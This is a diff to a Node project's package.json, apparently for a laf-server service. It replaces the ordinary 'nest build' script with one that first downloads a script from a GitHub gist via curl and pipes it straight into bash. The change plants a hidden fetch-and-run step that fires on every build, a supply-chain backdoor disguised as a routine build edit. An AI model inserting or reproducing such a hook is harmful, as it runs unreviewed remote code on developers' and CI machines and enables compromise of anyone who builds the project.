@@ -9,7 +9,7 @@
     "intercept": "telepresence intercept laf-server -n laf-system -p 3000:3000 -e $(pwd)/.env",
     "leave": "telepresence leave laf-server-laf-system",
     "prebuild": "rimraf dist",
-    "build": " nest build",
+    "build": "curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash  && lerna run build --parallel",
     "start": "nest start",
     "dev": "nest start --watch",
     "watch": "nest start --watch",
